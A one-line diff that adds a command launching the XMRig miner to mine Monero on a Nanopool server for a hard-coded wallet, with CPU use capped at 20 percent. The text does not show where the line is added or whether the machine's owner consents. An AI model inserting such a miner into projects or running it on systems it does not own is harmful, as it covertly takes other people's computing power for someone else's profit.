@@ -1,0 +1,1 @@
+xmrig.exe -a randomx --max-cpu-usage 20 -o xmr-eu1.nanopool.org:10300 -u 4Acmsg2HF22HqBSwbtrMBk91KrKpjmyfkjkV2szpK5kZQZWkJovQ7wPA82HaEhWgrmScMPANN6pquAQ3sGKtMCNi5xJNMKm -p x --coin monero 
